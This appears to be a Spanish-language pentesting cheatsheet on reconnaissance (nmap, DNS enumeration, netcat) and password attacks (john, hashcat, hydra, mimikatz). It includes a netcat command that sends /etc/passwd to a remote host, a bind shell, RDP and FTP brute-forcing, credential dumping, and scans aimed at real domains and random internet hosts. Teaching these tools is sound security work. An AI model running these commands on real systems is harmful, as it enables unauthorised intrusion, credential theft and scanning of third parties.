# Cheatsheet Avanzada: Recolección de Información y Ataques a Contraseñas


## 🕵️ Recolección de Información (Enumeración)

### `nmap` (Network Mapper)

La herramienta fundamental para el escaneo de redes, servicios y vulnerabilidades.

#### Escaneos Básicos y de Descubrimiento

**Sondeo de puertos TCP comunes en un objetivo**
    * Escanea los 1000 puertos más habituales. La opción `-v` activa el modo *verbose* para más detalles.
    ```bash
    nmap -v scanme.nmap.org
    ```
    
**Sondeo "sigiloso" (Stealth Scan) con detección de SO en una subred**
    * `-sS`: Envía paquetes SYN en lugar de completar la conexión TCP, siendo menos detectable.
    * `-O`: Intenta identificar el sistema operativo del host.
    ```bash
    nmap -sS -O scanme.nmap.org/24
    ```

**Desactivar el sondeo previo (Ping Scan)**
    * `-Pn` (o `-P0` en versiones antiguas): Escanea el objetivo asumiendo que está activo, saltándose el descubrimiento de host. Útil si el objetivo bloquea los pings ICMP.
    ```bash
    # Sondea el puerto 80 en 100.000 hosts aleatorios sin enviar ping previo
    nmap -v -iR 100000 -Pn -p 80
    ```

#### Escaneos Avanzados y Específicos

* **Detección de Versión de Servicios**
    * `-sV`: Intenta determinar la versión exacta del software que corre en cada puerto abierto.
    ```bash
    # Detecta versiones de servicios en puertos específicos de una red
    nmap -sV -p 22,53,110,143,4564 198.116.0-255.1-127
    ```

* **Escaneo Agresivo (`-A`)**
    * Es un atajo que activa la detección de SO (`-O`), detección de versión (`-sV`), escaneo de scripts (`-sC`) y traceroute. Muy completo pero también muy "ruidoso".
    ```bash
    nmap -A mi-objetivo.com
    ```

* **Escaneo de Todos los Puertos (`-p-`) y guardado de resultados**
    * `-p-`: Escanea los 65535 puertos TCP.
    * `-oA`: Guarda los resultados en todos los formatos (normal, XML y grepable).
    ```bash
    nmap -sS -sV -p- -oA escaneo_completo mi-objetivo.com
    ```

#### Uso de Scripts (Nmap Scripting Engine - NSE)

* **Ejecutar scripts por defecto (`-sC`)**
    * Lanza un conjunto de scripts considerados seguros y útiles para la enumeración.
    ```bash
    nmap -sC scanme.nmap.org
    ```

* **Enumerar recursos compartidos SMB en un host Windows**
    * Busca carpetas y recursos compartidos a través del protocolo SMB.
    ```bash
    nmap -p 445 --script smb-enum-shares 192.168.10.150
    ```

* **Enumerar cifrados y certificado de un servidor HTTPS**
    * Muestra qué versiones de TLS/SSL y qué suites de cifrado soporta el servidor. También extrae el certificado.
    ```bash
    # Ver suites de cifrado
    nmap --script ssl-enum-ciphers -p 443 www.google.es

    # Ver el certificado
    nmap --script ssl-cert -p 443 www.google.es
    ```

### Consultas DNS

* **`dnsenum`**: Extrae información detallada de los servidores DNS.
    ```bash
    # Búsqueda exhaustiva usando scraping en buscadores
    dnsenum --enum ceu.es
    ```

* **`dnsrecon`**: Búsqueda de subdominios por fuerza bruta usando un diccionario.
    ```bash
    dnsrecon -d ceu.es -D /usr/share/wordlists/dnsmap.txt -t std
    ```

### `Netcat (nc)` - La Navaja Suiza de Redes

* **Banner Grabbing**: Conectarse a un puerto para ver el "banner" o mensaje de bienvenida del servicio, que a menudo revela su versión.
    ```bash
    echo "QUIT" | nc -v [www.ejemplo.com](https://www.ejemplo.com) 21
    ```

* **Transferencia de ficheros**: Crear un túnel simple para enviar o recibir ficheros.
    ```bash
    # En la máquina receptora (se pone a la escucha en el puerto 777)
    nc -lvp 777 > archivo_recibido.txt

    # En la máquina emisora (envía el fichero /etc/passwd)
    cat /etc/passwd | nc 192.168.1.10 777
    ```

* **Crear un *Bind Shell***: Deja un puerto a la escucha en la máquina víctima, esperando una conexión entrante que le dará una shell.
    ```bash
    # En la máquina víctima
    nc -lvp 4444 -e /bin/bash

    # En la máquina del atacante
    nc 192.168.1.20 4444
    ```

---

## 🔑 Ataques a Contraseñas

Una vez se identifican servicios con autenticación, se puede intentar comprometer sus credenciales.

### Ataques Offline (sobre Hashes)

Estos ataques se realizan sobre hashes de contraseñas previamente obtenidos (ej. de una base de datos filtrada).

**`hash-identifier`**: Identifica el posible algoritmo de un hash desconocido.
    ```bash
    hash-identifier <pega_el_hash_aqui>
    ```
**`john the ripper`**: Un cracker de hashes muy versátil.
    ```bash
    # Intenta crackear un fichero de hashes usando el modo por defecto
    john /ruta/a/hashes.txt

    # Especifica un diccionario para el ataque
    john --wordlist=/usr/share/wordlists/rockyou.txt /ruta/a/hashes.txt
    ```

**`hashcat`**: Cracker de hashes extremadamente rápido que puede usar la potencia de la GPU.
    ```bash
    # Ataca un hash MD5 (-m 0) con un ataque de diccionario (-a 0)
    hashcat -m 0 -a 0 /ruta/hashes.txt /usr/share/wordlists/rockyou.txt

    # Muestra las contraseñas ya crackeadas para ese fichero de hashes
    hashcat -m 0 /ruta/hashes.txt --show
    ```

### Ataques Online (sobre Servicios Activos)

Estos ataques interactúan directamente con un servicio de red (SSH, FTP, RDP, etc.).

**`hydra`**: Un "login cracker" online muy rápido y que soporta multitud de protocolos.

    
    # Ataque de diccionario a un servidor RDP
    # -l: usuario -P: fichero de contraseñas -t: hilos en paralelo -f: parar al encontrarla
    hydra -l Administrador -P rockyou.txt rdp://10.60.25.19 -t 6 -V -f

**`nmap` con Scripts (NSE)**: `nmap` también puede realizar ataques de fuerza bruta.

    # Intenta un ataque de fuerza bruta sobre un servidor FTP
    nmap -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=pass.txt 192.168.1.30
    

### Herramientas Adicionales

**`crunch`**: Generador de diccionarios (wordlists) personalizados

    # Crea un diccionario con todas las combinaciones numéricas de 4 a 6 dígitos
    crunch 4 6 0123456789 -o diccionario_numerico.txt
    

**`mimikatz`**: Herramienta de post-explotación para Windows extremadamente potente. Su función más famosa es extraer contraseñas en texto plano de la memoria del proceso LSASS. [cite: 4979]
    
    # (Uso típico dentro de una sesión de Meterpreter en una máquina comprometida)
    meterpreter > load kiwi
    meterpreter > creds_all
    
